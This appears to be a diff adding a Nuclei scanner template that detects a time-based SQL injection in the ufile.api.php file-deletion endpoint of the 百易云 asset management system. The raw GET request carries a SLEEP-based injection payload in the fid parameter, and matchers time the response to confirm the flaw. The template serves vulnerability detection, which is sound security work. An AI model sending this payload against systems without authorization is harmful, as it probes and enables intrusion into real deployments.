@@ -1,0 +1,42 @@
+id: poc-yaml-baiyishequ-ufile-api-php-sqli
+info:
+  name: 百易云资产管理运营系统 ufile.api.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in 百易云资产管理运营系统's ufile.api.php endpoint, specifically in the file deletion functionality.
+
+variables:
+  t1: '{{rand_int(1,5)}}'
+  t2: '{{to_number(t1) * 2}}'
+  t3: '{{to_number(t2) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP({{t1}})))UPCw) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-Test
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"code":'
+          - '"req_id":'
+
+      - type: word
+        part: header
+        words:
+          - 'X-Powered-By: baiyiyun'
+
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t2)'
+          - 'duration < to_number(t3)'
